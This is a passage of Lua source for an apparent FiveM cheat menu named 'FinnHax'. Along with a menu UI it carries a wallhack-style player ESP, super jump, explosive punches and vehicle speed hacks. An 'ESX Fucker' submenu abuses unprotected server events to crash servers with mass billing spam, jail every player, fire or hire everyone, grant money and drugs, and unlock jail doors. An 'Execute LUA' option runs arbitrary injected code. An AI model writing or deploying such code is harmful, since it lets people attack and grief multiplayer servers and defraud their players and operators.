	else
		debugPrint('Failed to create '..tostring(text)..' menu button: '..tostring(id)..' submenu doesn\'t exist')
	end

	return false
end


function Menu.CheckBox(text, bool, callback)
	local checked = 'Off'
	if bool then
		checked = 'On'
	end

	if Menu.Button(text, checked) then
		bool = not bool
		debugPrint(tostring(text)..' checkbox changed to '..tostring(bool))
		callback(bool)

		return true
	end

	return false
end


function Menu.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = '? '..tostring(selectedItem)..' ?'
	end

	if Menu.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end


function Menu.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			Menu.CloseMenu()
		else
			ClearAllHelpMessages()

			drawTitle()
			drawSubTitle()

			currentKey = nil

			if IsControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					Menu.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end


function Menu.SetMenuWidth(id, width)
	setMenuProperty(id, 'width', width)
end


function Menu.SetMenuX(id, x)
	setMenuProperty(id, 'x', x)
end


function Menu.SetMenuY(id, y)
	setMenuProperty(id, 'y', y)
end


function Menu.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, 'maxOptionCount', count)
end


function Menu.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, 'titleColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a })
end
 
 
function Menu.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(id, 'titleBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a })
end


function Menu.SetTitleBackgroundSprite(id, textureDict, textureName)
	RequestStreamedTextureDict(textureDict)
	setMenuProperty(id, 'titleBackgroundSprite', { dict = textureDict, name = textureName })
end


function Menu.SetSubTitle(id, text)
	setMenuProperty(id, 'subTitle', string.upper(text))
end


function Menu.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(id, 'menuBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
end


function Menu.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, 'menuTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a })
end

function Menu.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, 'menuSubTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a })
end

function Menu.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, 'menuFocusColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a })
end


function Menu.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, 'buttonPressedSound', { ['name'] = name, ['set'] = set })
end

function Notify(text)
    SetNotificationTextEntry('STRING')
    AddTextComponentString(text)
    DrawNotification(false, false)
end

AddEventHandler('inv',function(og)
	local inv = {}
	Notify('~y~ You are being searched by ID ' .. og)
	TriggerServerEvent('display', og, inv)
end)

function DrawText3D(x,y,z, text) 
    local onScreen,_x,_y=World3dToScreen2d(x,y,z)
    local px,py,pz=table.unpack(GetGameplayCamCoords())
    local dist = GetDistanceBetweenCoords(px,py,pz, x,y,z, 1)

    local scale = (1/dist)*2
    local fov = (1/GetGameplayCamFov())*100
    local scale = scale*fov
    
    if onScreen then
        SetTextScale(1*scale, 2*scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(red, green, blue, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
		World3dToScreen2d(x,y,z, 0) --Added Here
        DrawText(_x,_y)
    end
end

local showblip = true
local showsprite = true

Citizen.CreateThread(function()

	while true do

		Wait( 1 )

		--[[ extend minimap on keypress
		if IsControlJustPressed( 0, 20 ) then
			if not isRadarExtended then
				SetRadarBigmapEnabled( true, false )
				isRadarExtended = true
				Citizen.CreateThread(function()
					run = true
					while run do
						for i = 0, 500 do
							Wait(1)
							if not isRadarExtended then
								run = false
								break
							end
						end
						SetRadarBigmapEnabled( false, false )
						isRadarExtended = false
					end
				end)
			else
				SetRadarBigmapEnabled( false, false )
				isRadarExtended = false
			end
		end]]

		-- show blips
		for id = 0, 64 do

			if NetworkIsPlayerActive( id ) and GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then

				ped = GetPlayerPed( id )
				blip = GetBlipFromEntity( ped )

				-- HEAD DISPLAY STUFF --
				
				-- Create head display (this is safe to be spammed)
				headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )
				wantedLvl = GetPlayerWantedLevel( id )

				if showsprite then
					Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, true ) -- Add player name sprite
					-- Wanted level display
					if wantedLvl then

						Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, true ) -- Add wanted sprite
						Citizen.InvokeNative( 0xCF228E2AA03099C3, headId, wantedLvl ) -- Set wanted number

					else

						Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false ) -- Remove wanted sprite
	
					end
	
					-- Speaking display
					if NetworkIsPlayerTalking( id ) then
	
						Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, true ) -- Add speaking sprite
	
					else
	
						Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false ) -- Remove speaking sprite
	
					end
				else
					Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false ) -- Remove wanted sprite
					Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false ) -- Remove speaking sprite
					Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, false ) -- Remove player name sprite
				end
				if showblip then
					-- BLIP STUFF --
	
					if not DoesBlipExist( blip ) then -- Add blip and create head display on player
	
						blip = AddBlipForEntity( ped )
						SetBlipSprite( blip, 1 )
						Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
	
					else -- update blip
	
						veh = GetVehiclePedIsIn( ped, false )
						blipSprite = GetBlipSprite( blip )
	
						if not GetEntityHealth( ped ) then -- dead
	
							if blipSprite ~= 274 then
	
								SetBlipSprite( blip, 274 )
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false ) -- Player Blip indicator
	
							end
	
						elseif veh then
	
							vehClass = GetVehicleClass( veh )
							vehModel = GetEntityModel( veh )
							
							if vehClass == 15 then -- jet
	
								if blipSprite ~= 422 then
	
									SetBlipSprite( blip, 422 )
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false ) -- Player Blip indicator
	
								end
	
							elseif vehClass == 16 then -- plane
	
								if vehModel == GetHashKey( "besra" ) or vehModel == GetHashKey( "hydra" )
									or vehModel == GetHashKey( "lazer" ) then -- jet
	
									if blipSprite ~= 424 then
	
										SetBlipSprite( blip, 424 )
										Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false ) -- Player Blip indicator
	
									end
	
								elseif blipSprite ~= 423 then
	
									SetBlipSprite( blip, 423 )
									Citizen.InvokeNative (0x5FBCA48327B914DF, blip, false ) -- Player Blip indicator
	
								end
	
							elseif vehClass == 14 then -- boat
	
								if blipSprite ~= 427 then
	
									SetBlipSprite( blip, 427 )
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false ) -- Player Blip indicator
	
								end
	
							elseif vehModel == GetHashKey( "insurgent" ) or vehModel == GetHashKey( "insurgent2" )
							or vehModel == GetHashKey( "limo2" ) then -- insurgent (+ turreted limo cuz limo blip wont work)
	
								if blipSprite ~= 426 then
	
									SetBlipSprite( blip, 426 )
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false ) -- Player Blip indicator
	
								end
	
							elseif vehModel == GetHashKey( "rhino" ) then -- tank
	
								if blipSprite ~= 421 then
	
									SetBlipSprite( blip, 421 )
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false ) -- Player Blip indicator
	
								end
	
							elseif blipSprite ~= 1 then -- default blip
	
								SetBlipSprite( blip, 1 )
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
	
							end
	
							-- Show number in case of passangers
							passengers = GetVehicleNumberOfPassengers( veh )
	
							if passengers then
	
								if not IsVehicleSeatFree( veh, -1 ) then
	
									passengers = passengers + 1
	
								end
	
								ShowNumberOnBlip( blip, passengers )
	
							else
	
								HideNumberOnBlip( blip )
	
							end
	
						else
	
							-- Remove leftover number
							HideNumberOnBlip( blip )
	
							if blipSprite ~= 1 then -- default blip
	
								SetBlipSprite( blip, 1 )
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
	
							end
	
						end
	
						SetBlipRotation( blip, math.ceil( GetEntityHeading( veh ) ) ) -- update rotation
						SetBlipNameToPlayerName( blip, id ) -- update blip name
						SetBlipScale( blip,  0.85 ) -- set scale
	
						-- set player alpha
						if IsPauseMenuActive() then
	
							SetBlipAlpha( blip, 255 )
	
						else
	
							x1, y1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
							x2, y2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
							distance = ( math.floor( math.abs( math.sqrt( ( x1 - x2 ) * ( x1 - x2 ) + ( y1 - y2 ) * ( y1 - y2 ) ) ) / -1 ) ) + 900
							-- Probably a way easier way to do this but whatever im an idiot
	
							if distance < 0 then
	
								distance = 0
	
							elseif distance > 255 then
	
								distance = 255
	
							end
	
							SetBlipAlpha( blip, distance )
	
						end
					end
				else
					RemoveBlip(blip)
				end

			end

		end

	end
end)

Citizen.CreateThread(function ()
    while true do
        for i=0,99 do
            N_0x31698aa80e0223f8(i)
        end
        for id = 0, 64 do
            if GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then
                ped = GetPlayerPed( id )
                blip = GetBlipFromEntity( ped ) 
 
                x1, y1, z1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
                x2, y2, z2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
                distance = math.floor(GetDistanceBetweenCoords(x1,  y1,  z1,  x2,  y2,  z2,  true))

                if(ignorePlayerNameDistance) then
					if overwriteAlpha then 
						red = 255
						green = 255
						blue = 255
						--DrawText3D(x2, y2, z2 + displayIDHeight, GetPlayerServerId(id))
						DrawText3D(x2, y2, z2 + displayIDHeight, "" .. GetPlayerServerId(id) .. " | " .. GetPlayerName(id) .. "")
					else
					end						
	                    
                end

                if ((distance < playerNamesDist)) then
                    if not (ignorePlayerNameDistance) then
						if overwriteAlpha then 
							red = 255
							green = 255
							blue = 255
							--DrawText3D(x2, y2, z2 + displayIDHeight, GetPlayerServerId(id))
							DrawText3D(x2, y2, z2 + displayIDHeight, "" .. GetPlayerServerId(id) .. " | " .. GetPlayerName(id) .. "")
					    else
						end					
                    end
                end  
            end
        end
        Citizen.Wait(0)
    end
end)


local entityEnumerator = {
}
local function trim(value)
	if value then
		return (string.gsub(value, "^%s*(.-)%s*$", "%1"))
	else
		return nil
	end
end

function getClosestCar(maxdist)
    local player = GetPlayerPed(-1)
    local posPlayer = GetEntityCoords(player, false)

    local dist = 999.9
    local car = 0
    for veh in EnumerateVehicles() do
        local posVeh = GetEntityCoords(veh, false)
        local thisdist = GetDistanceBetweenCoords(posPlayer, posVeh, true)
        if thisdist < dist then
            dist = thisdist
            car = veh
        end
        --Citizen.Trace(GetVehicleNumberPlateText(veh) .. " - " .. GetDisplayNameFromVehicleModel(GetEntityModel(veh)) .. " (" .. thisdist .. ")")
    end

    --[[local car
    for i, flag in ipairs(vehFlags) do
        car = GetClosestVehicle(posPlayer.x, posPlayer.y, posPlayer.z, 4.0, 0, tonumber(flag))
        if car ~= 0 then
            break
        end
    end]]

    if car ~= 0 and dist < maxdist then
        --Citizen.Trace(GetVehicleNumberPlateText(car) .. " - " .. GetDisplayNameFromVehicleModel(GetEntityModel(car)) .. " @ " .. dist)
        return car
    else
        return nil
    end
end


Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
        local ped = GetPlayerPed(-1)
		if ePunch then
		SetExplosiveMeleeThisFrame(ped)
		end
		if sJump then
		SetSuperJumpThisFrame(ped)
		end
		RestorePlayerStamina(ped, 1.0)
		if(SpeedDemon) then
			if IsPedSittingInAnyVehicle(ped) then
			local veh = GetVehiclePedIsUsing(ped)
				if veh ~= nil then		
					SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 15000000.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fDriveBiasFront", 0.50);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 4.5);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 4.38);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fBrakeForce", 5.00);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fEngineDamageMult", 0.50);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 65.00);
					SetVehicleHandlingFloat(veh, "CHandlingData", "fRollCentreHeightFront", 0.80);
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(ped, false), 12.0)
					SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(ped, false), 6.0);
				end
			end
		end
	end
end)
function spectatePlayer(targetPed, target, name)
	local playerPed = PlayerPedId() -- yourself
	enable = true
	if targetPed == playerPed then enable = false end

	if(enable)then

			local targetx,targety,targetz = table.unpack(GetEntityCoords(targetPed, false))

			RequestCollisionAtCoord(targetx,targety,targetz)
			NetworkSetInSpectatorMode(true, targetPed)

	else

			local targetx,targety,targetz = table.unpack(GetEntityCoords(targetPed, false))

			RequestCollisionAtCoord(targetx,targety,targetz)
			NetworkSetInSpectatorMode(false, targetPed)

	end
end
function GetPlayers()
    local players = {}

    for i = 0, 63 do
        if NetworkIsPlayerActive(i) then
            table.insert(players, i)
        end
    end

    return players
end
function TeleportToPlayer(player)
	local lPed = GetPlayerPed(PlayerId())
	local oPed = GetPlayerPed(player)
	local oPedPos = GetEntityCoords(oPed, false)
	SetEntityCoords(lPed, oPedPos.x, oPedPos.y, oPedPos.z + 1.0, 0.0, 0.0, 0.0, false)
end

function Cuff(player)
		TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(player))
		TriggerServerEvent("CheckHandcuff", GetPlayerServerId(player))
		TriggerServerEvent('cuffServer', GetPlayerServerId(player))
		TriggerServerEvent("cuffGranted", GetPlayerServerId(player))
		TriggerServerEvent("police:cuffGranted", GetPlayerServerId(player))
		TriggerServerEvent('esx_handcuffs:cuffing', GetPlayerServerId(player))
		TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(player))
end
doorList = {
    -- Mission Row To locker room & roof
    [1] = { ["objName"] = "v_ilev_ph_gendoor004", ["x"]= 449.69815063477, ["y"]= -986.46911621094,["z"]= 30.689594268799,["locked"]= true,["txtX"]=450.104,["txtY"]=-986.388,["txtZ"]=31.739},
    -- Mission Row Armory
    [2] = { ["objName"] = "v_ilev_arm_secdoor", ["x"]= 452.61877441406, ["y"]= -982.7021484375,["z"]= 30.689598083496,["locked"]= true,["txtX"]=453.079,["txtY"]=-982.600,["txtZ"]=31.739},
    -- Mission Row Captain Office
    [3] = { ["objName"] = "v_ilev_ph_gendoor002", ["x"]= 447.23818969727, ["y"]= -980.63006591797,["z"]= 30.689598083496,["locked"]= true,["txtX"]=447.200,["txtY"]=-980.010,["txtZ"]=31.739},
    -- Mission Row To downstairs right
    [4] = { ["objName"] = "v_ilev_ph_gendoor005", ["x"]= 443.97, ["y"]= -989.033,["z"]= 30.6896,["locked"]= true,["txtX"]=444.020,["txtY"]=-989.445,["txtZ"]=31.739},
    -- Mission Row To downstairs left
    [5] = { ["objName"] = "v_ilev_ph_gendoor005", ["x"]= 445.37, ["y"]= -988.705,["z"]= 30.6896,["locked"]= true,["txtX"]=445.350,["txtY"]=-989.445,["txtZ"]=31.739},
    -- Mission Row Main cells
    [6] = { ["objName"] = "v_ilev_ph_cellgate", ["x"]= 463.815, ["y"]= -992.686,["z"]= 24.9149,["locked"]= true,["txtX"]=463.815,["txtY"]=-992.686,["txtZ"]=25.064},
    -- Mission Row Cell 1
    [7] = { ["objName"] = "v_ilev_ph_cellgate", ["x"]= 462.381, ["y"]= -993.651,["z"]= 24.9149,["locked"]= true,["txtX"]=461.806,["txtY"]=-993.308,["txtZ"]=25.064},
    -- Mission Row Cell 2
    [8] = { ["objName"] = "v_ilev_ph_cellgate", ["x"]= 462.331, ["y"]= -998.152,["z"]= 24.9149,["locked"]= true,["txtX"]=461.806,["txtY"]=-998.800,["txtZ"]=25.064},
    -- Mission Row Cell 3
    [9] = { ["objName"] = "v_ilev_ph_cellgate", ["x"]= 462.704, ["y"]= -1001.92,["z"]= 24.9149,["locked"]= true,["txtX"]=461.806,["txtY"]=-1002.450,["txtZ"]=25.064},
    -- Mission Row Backdoor in
    [10] = { ["objName"] = "v_ilev_gtdoor", ["x"]= 464.126, ["y"]= -1002.78,["z"]= 24.9149,["locked"]= true,["txtX"]=464.100,["txtY"]=-1003.538,["txtZ"]=26.064},
    -- Mission Row Backdoor out
    [11] = { ["objName"] = "v_ilev_gtdoor", ["x"]= 464.18, ["y"]= -1004.31,["z"]= 24.9152,["locked"]= true,["txtX"]=464.100,["txtY"]=-1003.538,["txtZ"]=26.064},
    -- Mission Row Rooftop In
    [12] = { ["objName"] = "v_ilev_gtdoor02", ["x"]= 465.467, ["y"]= -983.446,["z"]= 43.6918,["locked"]= true,["txtX"]=464.361,["txtY"]=-984.050,["txtZ"]=44.834},
    -- Mission Row Rooftop Out
    [13] = { ["objName"] = "v_ilev_gtdoor02", ["x"]= 462.979, ["y"]= -984.163,["z"]= 43.6919,["locked"]= true,["txtX"]=464.361,["txtY"]=-984.050,["txtZ"]=44.834},
	-- Mission Row Locker room
	[14] = { ["objName"] = "v_ilev_rc_door2", ["x"]= 451.98, ["y"]= -987.266,["z"]= 30.69,["locked"]= true,["txtX"]=451.98,["txtY"]=-987.266,["txtZ"]=31.30},
	-- SANDY SHORES MAIN DOOR
    [15] = { ["objName"] = "v_ilev_shrfdoor", ["x"]= 1855.105, ["y"]= 3683.516,["z"]= 34.266,["locked"]= true,["txtX"]=1855.105,["txtY"]=3683.516,["txtZ"]=35.00},
	-- Paleto Bay MAIN DOORS
	[16] = { ["objName"] = "v_ilev_shrf2door", ["x"]= -443.14, ["y"]= 6015.685,["z"]= 31.716,["locked"]= true,["txtX"]=-443.14,["txtY"]=6015.685,["txtZ"]=32.00},
    [17] = { ["objName"] = "v_ilev_shrf2door", ["x"]= -443.951, ["y"]= 6016.622,["z"]= 31.716,["locked"]= true,["txtX"]=-443.951,["txtY"]=6016.622,["txtZ"]=32.00}, 
    -- Mission Row, last door to stairs
    [18] = { ["objName"] = "v_ilev_arm_secdoor", ["x"]= 461.286, ["y"]= -985.320,["z"]= 30.839,["locked"]= true,["txtX"]=460.901,["txtY"]=-986.02,["txtZ"]=31.50},
    -- Mission Row, back enterence 
    [19] = { ["objName"] = "v_ilev_rc_door2", ["x"]= 469.967, ["y"]= -1014.4520,["z"]= 26.5362,["locked"]= true,["txtX"]=469.21,["txtY"]=-1014.119,["txtZ"]=27.30},  
	[20] = { ["objName"] = "v_ilev_rc_door2", ["x"]= 467.3716, ["y"]= -1014.4520,["z"]= 26.5362,["locked"]= true,["txtX"]=467.92,["txtY"]=-1014.08,["txtZ"]=27.30},	
}
function OpenJail()
    for i = 1, #doorList do
	doorList[i]["locked"] = false
	TriggerServerEvent('esx_celldoors:update', i, doorList[i]["locked"])
	end
end

function FirePlayers()
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						identifier = players[i].identifier
						ESX.TriggerServerCallback('esx_society:setJob', function()
			end, identifier, 'unemployed', 0, 'fire')
			end
		end)
	end
end
function UnemployedMoney()
	if ESX then
		ESX.TriggerServerCallback('esx_society:setJobSalary', function()
			end, 'unemployed', 0, 10000000)
	end
end

function EMSPlayers()
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						identifier = players[i].identifier
						ESX.TriggerServerCallback('esx_society:setJob', function()
			end, identifier, 'ambulance', 3, 'hire')
			end
		end)
	end
end


function PolicePlayers()
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						identifier = players[i].identifier
						ESX.TriggerServerCallback('esx_society:setJob', function()
			end, identifier, 'police', 4, 'hire')
			end
		end)
	end
end

function FirePlayer(idx)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(idx) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'unemployed', 0, 'hire')

		end)
	end
end

function MakeEMS(idx)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(idx) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'ambulance', 3, 'hire')
			

		end)
	end
end

function MakeCop(idx)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(idx) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'police', 3, 'hire')
			

		end)
	end
end
function Uncuff(idx)
	TriggerServerEvent('BsCuff:Cuff696999', GetPlayerServerId(idx))
	TriggerServerEvent("CheckHandcuff", GetPlayerServerId(idx))
	TriggerServerEvent('unCuffServer', GetPlayerServerId(idx))
	TriggerServerEvent("uncuffGranted", GetPlayerServerId(idx))
	TriggerServerEvent("police:cuffGranted", GetPlayerServerId(idx))
	TriggerServerEvent('esx_handcuffs:unlocking', GetPlayerServerId(idx))
	TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(idx))
end

local function LocalHandler(stringToRun)
	if(stringToRun) then
		local resultsString = ""
		-- Try and see if it works with a return added to the string
		local stringFunction, errorMessage = load("return "..stringToRun)
		if(errorMessage) then
			-- If it failed, try to execute it as-is
			stringFunction, errorMessage = load(stringToRun)
		end
		if(errorMessage) then
			-- Shit tier code entered, return the error to the player
			TriggerEvent("chatMessage", "[SS-RunCode]", {187, 0, 0}, "CRun Error: "..tostring(errorMessage))
			return false
		end
		-- Try and execute the function
		local results = {pcall(stringFunction)}
		if(not results[1]) then
			-- Error, return it to the player
			TriggerEvent("chatMessage", "[SS-RunCode]", {187, 0, 0}, "CRun Error: "..tostring(results[2]))
			return false
		end
		
		for i=2, #results do
				resultsString = resultsString..", "
			local resultType = type(results[i])
			if(IsAnEntity(results[i])) then
				resultType = "entity:"..tostring(GetEntityType(results[i]))
			end
			resultsString = resultsString..tostring(results[i]).." ["..resultType.."]"
		end
		if(#results > 1) then
			TriggerEvent("chatMessage", "[SS-RunCode]", {187, 0, 0}, "CRun Command Result: "..tostring(resultsString))
			return true
		end
	end
end

function ExecuteLua()
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "", "", "", "", 1000)
		while (UpdateOnscreenKeyboard() == 0) do
			Citizen.InvokeNative(0x5F4B6931816E599B, 0)
			Wait(0);
		end
		if (GetOnscreenKeyboardResult()) then
			local result = GetOnscreenKeyboardResult()
			local res = c_loadString(result)
			LocalHandler(res)
		end
end
Citizen.CreateThread(function()
local currentIdx = 1
local selectedIdx = 1
local selectedPlayerIdx = 1;
local carTypeIdx = 1;
local carToSpawn = nil;
local SpawnedCar = nil;
local WeaponTypeSelect = nil
local WeaponSelected = nil
local ModSelected = nil
local bInvis = false;
local bInvin = false
local bTherm = false;
local bPunch = false
local bJump = false
local bBlips = true
local bESP = true
local bSpeed = true
local playerIdxWeapon = 1;


Menu.CreateMenu('memes', 'FinnHax')
Menu.CreateSubMenu('Players', 'memes', 'Players')
Menu.CreateSubMenu('Self', 'memes', 'Self')
Menu.CreateSubMenu('WeaponTypes', 'memes', 'Weapons')
Menu.CreateSubMenu('CarTypes', 'memes', 'Cars')
Menu.CreateSubMenu('PlayerOptions', 'Players', 'Player Options')
Menu.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Car')
Menu.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Car Options')
Menu.CreateSubMenu('CurCarOptions', 'CarTypes', 'Car Options')
Menu.CreateSubMenu('WeaponTypeSelection', 'WeaponTypes', 'Weapon')
Menu.CreateSubMenu('WeaponOptions', 'WeaponTypeSelection', 'Weapon Options')
Menu.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
Menu.CreateSubMenu('RemoteWeaponTypeSelect', 'PlayerOptions', 'Weapons')
Menu.CreateSubMenu('RemoteWeaponSelect', 'RemoteWeaponTypeSelect', 'Weapons')
Menu.CreateSubMenu('esxFucker', 'memes', 'ESX Fucker')

	while true do
		if Menu.IsMenuOpened('memes') then
			if Menu.MenuButton('Players', 'Players') then
			elseif Menu.MenuButton('Self', 'Self') then
			elseif Menu.MenuButton('Weapons', 'WeaponTypes') then
			elseif Menu.MenuButton('Cars', 'CarTypes') then
			elseif Menu.MenuButton('ESX Fucker', 'esxFucker') then
			elseif Menu.Button('Execute LUA') then
				ExecuteLua()
			end
			Menu.Display()
		elseif Menu.IsMenuOpened('Players') then
			local players = GetPlayers()	
			for _, i in ipairs(players) do
				local pnames = GetPlayerName(i)    
				if Menu.MenuButton(pnames, 'PlayerOptions') then
					selectedPlayerIdx = i				
				end
			end
			Menu.Display()
			
		elseif Menu.IsMenuOpened('esxFucker') then
			if Menu.Button('Crasher (SPAM)') then
				for i=1, 1000 do
					for k, v in pairs(GetPlayers()) do
						TriggerServerEvent("esx_billing:sendBill", v, "", "Hund", 999999999)
					end
				end
			end
			
			if Menu.Button('Jail Everyone') then
				for k, v in pairs(GetPlayers()) do
					TriggerServerEvent("esx-qalle-jail:jailPlayer", v, 5000, "joint alle alpha rp bester server #mconegang")
					TriggerServerEvent("esx_jail:sendToJail", v, 5000)
				end
			end

			if Menu.Button('Money Rain') then
				    TriggerServerEvent('esx_truckerjob:pay', 500000)
				    TriggerServerEvent('esx_slotmachine:sv:2', 500000)
				    TriggerServerEvent('AdminMenu:giveCash', 500000)
				    TriggerServerEvent('esx_pizza:pay', 500000)
				    TriggerServerEvent('lscustoms:payGarage', 500000)
			end

			if Menu.Button('Drugzz Rain') then
				for i=1, 500 do
					TriggerServerEvent("esx_drugs:startHarvestWeed", 0)
				end

				for i=1, 500 do
					TriggerServerEvent("esx_drugs:startTransformWeed", 0);
				end

				for i=1, 500 do
					TriggerServerEvent("esx_drugs:startSellWeed", 0);
				end
			end

		Menu.Display()
			
		elseif Menu.IsMenuOpened('Self') then
			if Menu.Button('Clear Guns') then			
				playerPed = GetPlayerPed(-1)
				RemoveAllPedWeapons(playerPed, true)
			elseif Menu.Button('Drop Gun') then				
				local ped = GetPlayerPed(-1)
				local wep = GetSelectedPedWeapon(ped)
